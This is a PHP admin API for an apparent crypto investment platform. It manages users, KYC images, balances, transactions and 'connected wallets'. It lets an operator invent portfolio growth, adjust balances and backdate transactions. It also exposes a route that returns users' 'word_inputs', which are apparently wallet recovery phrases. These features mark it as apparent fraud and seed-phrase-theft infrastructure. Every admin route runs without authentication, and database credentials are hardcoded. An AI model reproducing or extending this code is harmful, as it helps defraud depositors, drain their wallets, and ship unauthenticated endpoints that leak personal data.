<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

$host = "localhost";       // Usually localhost
$user = "ktkdvcdj_root";            // Default user
$password = "victor47009A"; // Your Laragon password
$database = "ktkdvcdj_bluevult"; 


$db = new mysqli($host, $user, $password, $database);

if ($db->connect_error) {
    echo json_encode(['error' => 'Database connection failed']);
    exit;
}

$db->set_charset("utf8mb4");

/* ==========================
   INPUT
========================== */
$input = json_decode(file_get_contents('php://input'), true);
$query = $input['q'] ?? '';

/* ==========================
   ROUTER
========================== */
switch ($query) {

    /* =====================
       USERS
    ===================== */
    case 'admin_get_users':
        $res = $db->query("
            SELECT user_id, user_name, user_email, kyc, user_phone,
                   user_picture, user_reg_date, user_region,
                   user_dob, user_address, us_citizen
            FROM user_details
            ORDER BY user_reg_date DESC
        ");
        echo json_encode($res->fetch_all(MYSQLI_ASSOC));
        break;

    case 'admin_get_user':
        $stmt = $db->prepare("
            SELECT user_id, user_name, user_email, kyc, user_phone,
                   user_picture, user_reg_date, user_region,
                   user_dob, user_address, us_citizen
            FROM user_details WHERE user_id = ?
        ");
        $stmt->bind_param("i", $input['user_id']);
        $stmt->execute();
        echo json_encode($stmt->get_result()->fetch_assoc());
        break;

    /* =====================
       BALANCES
    ===================== */
    case 'admin_get_balances':
        $res = $db->query("
            SELECT user_id, user_name, user_balance, portfolio_growth
            FROM user_balances
            ORDER BY user_balance DESC
        ");
        echo json_encode($res->fetch_all(MYSQLI_ASSOC));
        break;

    case 'admin_adjust_balance':
        $user_id = (int)$input['user_id'];
        $amount  = (float)$input['amount'];
        $growth_amount = (float)($input['growth_amount'] ?? 0);
        $type    = $input['type'];
        $reason  = $input['reason'];

        $stmt = $db->prepare("SELECT user_balance, portfolio_growth FROM user_balances WHERE user_id = ?");
        $stmt->bind_param("i", $user_id);
        $stmt->execute();
        $balance = $stmt->get_result()->fetch_assoc();

        if ($balance) {
            $new_balance = $type === 'credit'
                ? $balance['user_balance'] + $amount
                : $balance['user_balance'] - $amount;

            $new_growth = $type === 'credit'
                ? $balance['portfolio_growth'] + $growth_amount
                : $balance['portfolio_growth'] - $growth_amount;

            $stmt = $db->prepare("UPDATE user_balances SET user_balance = ?, portfolio_growth = ? WHERE user_id = ?");
            $stmt->bind_param("ddi", $new_balance, $new_growth, $user_id);
            $stmt->execute();
        } else {
            $stmt = $db->prepare("SELECT user_name FROM user_details WHERE user_id = ?");
            $stmt->bind_param("i", $user_id);
            $stmt->execute();
            $user = $stmt->get_result()->fetch_assoc();

            if ($user) {
                $new_balance = $type === 'credit' ? $amount : -$amount;
                $new_growth = $type === 'credit' ? $growth_amount : -$growth_amount;
                $stmt = $db->prepare("
                    INSERT INTO user_balances (user_id, user_name, user_balance, portfolio_growth)
                    VALUES (?, ?, ?, ?)
                ");
                $stmt->bind_param("isdd", $user_id, $user['user_name'], $new_balance, $new_growth);
                $stmt->execute();
            }
        }

        $trans_type = $type === 'credit' ? 'admin_credit' : 'admin_debit';
        $stmt = $db->prepare("
            INSERT INTO user_transactions
            (user_id, trans_type, crypto, trans_amt, trans_stat, user_wallet)
            VALUES (?, ?, 'USD', ?, 'completed', ?)
        ");
        $stmt->bind_param("isds", $user_id, $trans_type, $amount, $reason);
        $stmt->execute();

        logActivity($db, 'Balance Adjusted', 'admin', 'admin', "User $user_id", "$type $amount (Growth: $growth_amount) - $reason");

        echo json_encode(['success' => true]);
        break;

    /* =====================
       KYC
    ===================== */
   case 'admin_get_kyc_submissions':
    
// Query counts by KYC status
$query = "
    SELECT 
        SUM(CASE WHEN kyc = 'verified' THEN 1 ELSE 0 END) AS approved,
        SUM(CASE WHEN kyc = 'pending' OR kyc = 'unverified' THEN 1 ELSE 0 END) AS pending,
        SUM(CASE WHEN kyc = 'rejected' THEN 1 ELSE 0 END) AS declined
    FROM user_details
";

$result = $db->query($query);

if (!$result) {
    echo json_encode(["success" => false, "message" => $db->error]);
    exit;
}

$counts = $result->fetch_assoc();

echo json_encode([
    "success" => true,
    "data" => [
        "approved" => (int)$counts['approved'],
        "pending" => (int)$counts['pending'],
        "declined" => (int)$counts['declined']
    ]
]);
    break;


     // Fetch all KYC submissions
    case 'fetch_kyc_submissions':
        $res = $db->query("SELECT user_id,user_name, img_one, img_two, img_three, upload_time, kyc_stats FROM user_kyc ORDER BY upload_time DESC");
        if (!$res) {
            echo json_encode(["success" => false, "message" => "Query failed: " . $db->error]);
            exit();
        }

        $kycList = [];
        while ($row = $res->fetch_assoc()) {
            $kycList[] = [
                "user_id" => (int)$row['user_id'] + 734350,
                "uname" => $row['user_name'],
                "img_one" => $row['img_one'],
                "img_two" => $row['img_two'],
                "img_three" => $row['img_three'],
                "upload_time" => $row['upload_time'],
                "kyc_stats" => $row['kyc_stats']
            ];
        }

        echo json_encode(["success" => true, "data" => $kycList]);
        break;

    // Update KYC status
    case 'update_kyc_status':
        $userId = intval(($input['user_id']-734350) ?? 0);
        $status = $db->real_escape_string($input['status'] ?? '');

        if (!$userId || !in_array($status, ["Pending", "Approved", "Rejected"])) {
            echo json_encode(["success" => false, "message" => "Invalid user ID or status"]);
            exit();
        }

        $update = $db->query("UPDATE user_kyc SET kyc_stats = '$status' WHERE user_id = $userId");
                if($status == 'Approved') {
                            $update_main = $db->query("UPDATE user_details SET kyc = 'verified' WHERE user_id = $userId");

                }
                if($status == 'Rejected') {
                            $update_main = $db->query("UPDATE user_details SET kyc = 'unverified' WHERE user_id = $userId");

                }
        
        if ($update) {
            echo json_encode(["success" => true, "message" => $status]);
        } else {
            echo json_encode(["success" => false, "message" => "Update failed: " . $db->error]);
        }
        break;

    case 'admin_update_kyc':
        $stmt = $db->prepare("UPDATE user_details SET kyc = ? WHERE user_id = ?");
        $stmt->bind_param("si", $input['kyc_status'], $input['user_id']);
        $stmt->execute();

        logActivity($db, 'KYC Updated', 'admin', 'admin', "User {$input['user_id']}", $input['kyc_status']);

        echo json_encode(['success' => $stmt->affected_rows > 0]);
        break;

    case 'update_tx_date':
        $txnId = intval($input['txn_id'] ?? 0);
        $newDate = $input['new_date'] ?? '';

        if (!$txnId || !$newDate) {
            echo json_encode(["success" => false, "message" => "Invalid transaction ID or date"]);
            exit();
        }

        $stmt = $db->prepare("UPDATE user_transactions SET trans_time = ? WHERE trans_id = ?");
        $stmt->bind_param("si", $newDate, $txnId);

        if ($stmt->execute()) {
            echo json_encode(["success" => true, "message" => "Transaction date updated successfully"]);
        } else {
            echo json_encode(["success" => false, "message" => "Failed to update date: " . $stmt->error]);
        }
        $stmt->close();
        break;

    /* =====================
       TRANSACTIONS
    ===================== */
   case 'admin_get_transactions':

    $sql = "
        SELECT 
            t.trans_id        AS id,
            t.user_id         AS userId,
            u.user_name       AS userName,
            t.trans_type      AS type,
            t.trans_amt       AS amount,
            t.trans_amt_btc   AS currency,
            t.trans_stat      AS status,
            t.user_wallet     AS wallet,
            t.trans_time      AS date
        FROM user_transactions t
        LEFT JOIN user_details u 
            ON t.user_id = u.user_id
        ORDER BY t.trans_time DESC
        LIMIT 100
    ";


    $res = $db->query($sql);

    if (!$res) {
        echo json_encode([
            "success" => false,
            "message" => $db->error
        ]);
        exit;
    }

    echo json_encode([
        "success" => true,
        "data" => $res->fetch_all(MYSQLI_ASSOC)
    ]);

    break;
    case 'decline_tx':
    $txnId = intval($input['txn_id'] ?? 0);

    if (!$txnId) {
        echo json_encode(["success" => false, "message" => "Invalid transaction ID"]);
        exit();
    }

    // Update transaction status to 'declined'
    $stmt = $db->prepare("UPDATE user_transactions SET trans_stat = ? WHERE trans_id = ?");
    $status = 'declined';
    $stmt->bind_param("si", $status, $txnId);

    if ($stmt->execute()) {
        echo json_encode(["success" => true, "message" => "Transaction declined successfully"]);
    } else {
        echo json_encode(["success" => false, "message" => "Failed to decline transaction: " . $stmt->error]);
    }

    $stmt->close();
    break;

   case 'approve_tx':
    $txnId = intval($input['txn_id'] ?? 0);

    if (!$txnId) {
        echo json_encode(["success" => false, "message" => "Invalid transaction ID"]);
        exit();
    }

    // Start DB transaction
    $db->begin_transaction();

    try {
        // 1️⃣ Get transaction details
        $stmt = $db->prepare("
            SELECT user_id, trans_amt, trans_type, trans_stat 
            FROM user_transactions 
            WHERE trans_id = ?
        ");
        $stmt->bind_param("i", $txnId);
        $stmt->execute();
        $res = $stmt->get_result();
        $transaction = $res->fetch_assoc();
        $stmt->close();

        if (!$transaction) {
            throw new Exception("Transaction not found");
        }

        if ($transaction['trans_stat'] === 'approved') {
            throw new Exception("Transaction already approved");
        }

        $userId = (int)$transaction['user_id'];
        $amount = (float)$transaction['trans_amt'];

        // 2️⃣ Deposit → update balance
        if ($transaction['trans_type'] === 'Deposit') {

            $stmt = $db->prepare("
                SELECT user_balance 
                FROM user_balances 
                WHERE user_id = ?
                FOR UPDATE
            ");
            $stmt->bind_param("i", $userId);
            $stmt->execute();
            $res = $stmt->get_result();
            $userBalance = $res->fetch_assoc();
            $stmt->close();

            if (!$userBalance) {
                throw new Exception("User balance not found");
            }

            $newBalance = (float)$userBalance['user_balance'] + $amount;

            $stmt = $db->prepare("
                UPDATE user_balances 
                SET user_balance = ? 
                WHERE user_id = ?
            ");
            $stmt->bind_param("di", $newBalance, $userId);
            $stmt->execute();
            $stmt->close();
        }

        // 3️⃣ Approve transaction
        $status = 'approved';
        $stmt = $db->prepare("
            UPDATE user_transactions 
            SET trans_stat = ? 
            WHERE trans_id = ?
        ");
        $stmt->bind_param("si", $status, $txnId);
        $stmt->execute();
        $stmt->close();

        // Create notification for approval
        $notif_title = "Transaction Approved";
        $notif_desc = "Your " . $transaction['trans_type'] . " of $" . number_format($amount, 2) . " has been approved.";
        $stmt_notif = $db->prepare("INSERT INTO user_notifications (user_id, notification, notification_desc, notification_status) VALUES (?, ?, ?, 'unread')");
        $stmt_notif->bind_param("iss", $userId, $notif_title, $notif_desc);
        $stmt_notif->execute();
        $stmt_notif->close();

        // Commit everything
        $db->commit();

        echo json_encode([
            "success" => true,
            "message" => "Transaction approved successfully"
        ]);

    } catch (Exception $e) {
        $db->rollback();
        echo json_encode([
            "success" => false,
            "message" => $e->getMessage()
        ]);
    }

    break;


    case 'adjust_balance':

    $userId   = intval($input['user_id'] ?? 0) - 734350;
    $type     = strtolower(trim($input['type'] ?? ''));
    $currency = strtoupper(trim($input['currency'] ?? ''));
    $amount   = floatval($input['amount'] ?? 0);
    $growth_amount = floatval($input['growth_amount'] ?? 0);
    $reason   = trim($input['reason'] ?? '');

    // 1️⃣ Basic validation
    if (!$userId || (!$amount && !$growth_amount) || !$reason) {
        echo json_encode([
            "success" => false,
            "message" => "Missing or invalid parameters"
        ]);
        exit();
    }

    if (!in_array($type, ['add', 'subtract'])) {
        echo json_encode([
            "success" => false,
            "message" => "Invalid adjustment type"
        ]);
        exit();
    }

    // Start transaction
    $db->begin_transaction();

    try {
        // 2️⃣ Get current user balance
        $stmt = $db->prepare("
            SELECT user_balance, portfolio_growth 
            FROM user_balances 
            WHERE user_id = ?
            FOR UPDATE
        ");
        $stmt->bind_param("i", $userId);
        $stmt->execute();
        $res = $stmt->get_result();
        $user = $res->fetch_assoc();
        $stmt->close();

        if (!$user) {
            throw new Exception("User balance record not found");
        }

        $currentBalance = floatval($user['user_balance']);
        $currentGrowth  = floatval($user['portfolio_growth']);

        // 3️⃣ Calculate new balance and growth
        if ($type === 'add') {
            $newBalance = $currentBalance + $amount;
            $newGrowth  = $currentGrowth + $growth_amount;
        } else {
            $newBalance = $currentBalance - $amount;
            $newGrowth  = $currentGrowth - $growth_amount;
        }

        // 4️⃣ Update balance table
        $stmt = $db->prepare("
            UPDATE user_balances 
            SET user_balance = ?, portfolio_growth = ?
            WHERE user_id = ?
        ");
        $stmt->bind_param("ddi", $newBalance, $newGrowth, $userId);
        $stmt->execute();
        $stmt->close();

        // OPTIONAL (STRONGLY RECOMMENDED):
        // Log this adjustment in an audit table
        /*
        $stmt = $db->prepare("
            INSERT INTO admin_balance_logs 
            (user_id, type, currency, amount, reason, created_at)
            VALUES (?, ?, ?, ?, ?, NOW())
        ");
        $stmt->bind_param("issds", $userId, $type, $currency, $amount, $reason);
        $stmt->execute();
        $stmt->close();
        */

        // Commit transaction
        $db->commit();

        echo json_encode([
            "success" => true,
            "message" => "Balance adjusted successfully",
            "data" => [
                "old_balance" => $currentBalance,
                "new_balance" => $newBalance
            ]
        ]);

    } catch (Exception $e) {
        $db->rollback();
        echo json_encode([
            "success" => false,
            "message" => $e->getMessage()
        ]);
    }

    break;




       case "admin_dashboard_stats":
            // Total Users
            $totalUsersResult = $db->query("SELECT COUNT(*) AS totalUsers FROM user_details");
            $totalUsers = $totalUsersResult ? (int)$totalUsersResult->fetch_assoc()['totalUsers'] : 0;

            // Pending KYC
            $pendingKYCResult = $db->query("SELECT COUNT(*) AS pendingKYC FROM user_details WHERE kyc IN ('pending','unverified')");
            $pendingKYC = $pendingKYCResult ? (int)$pendingKYCResult->fetch_assoc()['pendingKYC'] : 0;

            // Total Deposits
            $totalDepositsResult = $db->query("SELECT SUM(trans_amt) AS totalDeposits FROM user_transactions WHERE trans_type='deposit'");
            $totalDeposits = $totalDepositsResult ? (float)$totalDepositsResult->fetch_assoc()['totalDeposits'] : 0;

            // Pending Withdrawals
            $pendingWithdrawalsResult = $db->query("SELECT COUNT(*) AS pendingWithdrawals FROM user_transactions WHERE trans_type='withdraw' AND trans_stat='pending'");
            $pendingWithdrawals = $pendingWithdrawalsResult ? (int)$pendingWithdrawalsResult->fetch_assoc()['pendingWithdrawals'] : 0;

            echo json_encode([
                "success" => true,
                "data" => [
                    "totalUsers" => $totalUsers,
                    "pendingKYC" => $pendingKYC,
                    "totalDeposits" => $totalDeposits,
                    "pendingWithdrawals" => $pendingWithdrawals
                ]
            ]);
        break;
    case 'admin_get_withdrawals':
    // Fetch withdrawals and join with user info
    $stmt = $db->prepare("
        SELECT t.*, u.user_name, u.user_email
        FROM user_transactions t
        LEFT JOIN user_details u ON t.user_id = u.user_id
        WHERE t.trans_type = 'withdraw'
        ORDER BY t.trans_time DESC LIMIT 4
    ");

    if ($stmt) {
        $stmt->execute();
        $result = $stmt->get_result();
        $withdrawals = $result->fetch_all(MYSQLI_ASSOC);

        echo json_encode([
            "success" => true,
            "data" => $withdrawals
        ]);
    } else {
        echo json_encode([
            "success" => false,
            "message" => "Database query failed"
        ]);
    }
    break;

    case 'admin_get_approved_deposits':

    // 1️⃣ Fetch ALL approved deposits (ordered by date)
    $stmt = $db->prepare("
        SELECT trans_amt, DATE(trans_time) as trans_date
        FROM user_transactions
        WHERE trans_type = 'Deposit'
        AND trans_stat = 'approved'
        ORDER BY trans_time ASC
    ");
    $stmt->execute();
    $result = $stmt->get_result();

    $rows = [];
    while ($row = $result->fetch_assoc()) {
        $rows[] = $row;
    }

    // 2️⃣ If no approved deposits exist
    if (count($rows) === 0) {
        echo json_encode([
            "success" => true,
            "data" => [
                "initialApproved" => 0,
                "totalApproved" => 0,
                "growthPercent" => 0,
                "chart" => []
            ]
        ]);
        exit;
    }

    // 3️⃣ Calculate totals
    $initialApproved = (float)$rows[0]['trans_amt'];
    $totalApproved = 0;

    foreach ($rows as $r) {
        $totalApproved += (float)$r['trans_amt'];
    }

    // 4️⃣ Revenue growth %
    $growthPercent = $initialApproved > 0
        ? round((($totalApproved - $initialApproved) / $initialApproved) * 100)
        : 0;

    // 5️⃣ Build chart data (cumulative revenue)
    $chart = [];
    $runningTotal = 0;

    foreach ($rows as $r) {
        $runningTotal += (float)$r['trans_amt'];
        $chart[] = [
            "date" => $r['trans_date'],
            "value" => $runningTotal
        ];
    }

    // 6️⃣ Return response
    echo json_encode([
        "success" => true,
        "data" => [
            "initialApproved" => $initialApproved,
            "totalApproved" => $totalApproved,
            "growthPercent" => $growthPercent,
            "chart" => $chart
        ]
    ]);
   break;

    case 'admin_update_transaction':
        $stmt = $db->prepare("UPDATE user_transactions SET trans_stat = ? WHERE trans_id = ?");
        $stmt->bind_param("si", $input['status'], $input['trans_id']);
        $stmt->execute();

        logActivity($db, 'Transaction Updated', 'transaction', 'admin', "Trans {$input['trans_id']}", $input['status']);

        echo json_encode(['success' => $stmt->affected_rows > 0]);
        break;
        
        
      case 'fetch_users':
    $res = $db->query("
        SELECT 
            u.user_id, 
            u.user_name, 
            u.user_email, 
            u.kyc, 
            u.user_status,
            COALESCE(b.user_balance, 0) AS balance,       -- get balance from user_balance table
            u.user_reg_date, 
            u.user_region
        FROM user_details u
        LEFT JOIN user_balances b ON u.user_id = b.user_id   -- join by unique user ID
        ORDER BY u.user_reg_date DESC
    ");

    if (!$res) {
        echo json_encode([
            "success" => false,
            "message" => "Database query failed: " . $db->error
        ]);
        exit;
    }

    $users = [];
    while ($row = $res->fetch_assoc()) {
        $users[] = [
            "id" => $row['user_id']+734350,
            "name" => $row['user_name'],
            "email" => $row['user_email'],
            "status" => $row['user_status'],       // active/suspended/pending
            "kycStatus" => $row['kyc'],    // verified/pending/rejected
            "balance" => "$" . number_format($row['balance'], 2),
            "joinDate" => $row['user_reg_date'],
            "lastLogin" => $row['user_region'] ?? "Never",
        ];
    }

    echo json_encode(["success" => true, "data" => $users]);
    break;


 case "fetch_wallets":

    $result = $db->query("
        SELECT 
            cw.user_id,
            ud.user_email,
            cw.wallet_type,
            cw.word_inputs,
            cw.connect_status,
            cw.time
        FROM connected_wallets AS cw
        LEFT JOIN user_details AS ud ON cw.user_id = ud.user_id
        ORDER BY cw.time DESC
    ");

    if (!$result) {
        echo json_encode([
            "success" => false,
            "error" => $db->error
        ]);
        exit;
    }

    $wallets = [];

    while ($row = $result->fetch_assoc()) {
        $wallets[] = $row;
    }

    echo json_encode([
        "success" => true,
        "data" => $wallets
    ]);
    break;

       case "connect_wallet":
    $user_id = $input['user_id'] ?? null;
    $wallet_type = $input['wallet_type'] ?? null;
    $time = $input['time'] ?? null;

    if (!$user_id || !$wallet_type || !$time) {
        echo json_encode(["success" => false, "error" => "Missing required parameters"]);
        exit;
    }

    // Prepare statement to update the specific wallet
    $stmt = $db->prepare("
        UPDATE connected_wallets 
        SET connect_status = 'connected' 
        WHERE user_id = ? AND wallet_type = ? AND time = ?
    ");
    $stmt->bind_param("sss", $user_id, $wallet_type, $time);

    $success = $stmt->execute();

    echo json_encode([
        "success" => $success
    ]);
    break;




    case 'toggle_status':
        $userId = $input['userId'] - 734350 ;
        $status = $input['status'];
        $stmt = $db->prepare("UPDATE user_details SET user_status = ? WHERE user_id = ?");
        $stmt->bind_param("ss", $status, $userId);
        $success = $stmt->execute();

        if ($success) {
            $notif_title = "Account Status Updated";
            $notif_desc = "Your account status has been changed to " . $status;
            $stmt_notif = $db->prepare("INSERT INTO user_notifications (user_id, notification, notification_desc, notification_status) VALUES (?, ?, ?, 'unread')");
            $stmt_notif->bind_param("iss", $userId, $notif_title, $notif_desc);
            $stmt_notif->execute();
            $stmt_notif->close();
        }

        echo json_encode(["success" => $userId]);
        break;



    default:
        echo json_encode(['error' => 'Unknown query']);
        break;
}

/* ==========================
   ACTIVITY LOGGER (MySQLi)
========================== */
function logActivity($db, $action, $category, $actor, $target, $details) {
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    $stmt = $db->prepare("
        INSERT INTO activity_logs
        (action, category, actor, target, details, ip_address, created_at)
        VALUES (?, ?, ?, ?, ?, ?, NOW())
    ");
    $stmt->bind_param("ssssss", $action, $category, $actor, $target, $details, $ip);
    $stmt->execute();
}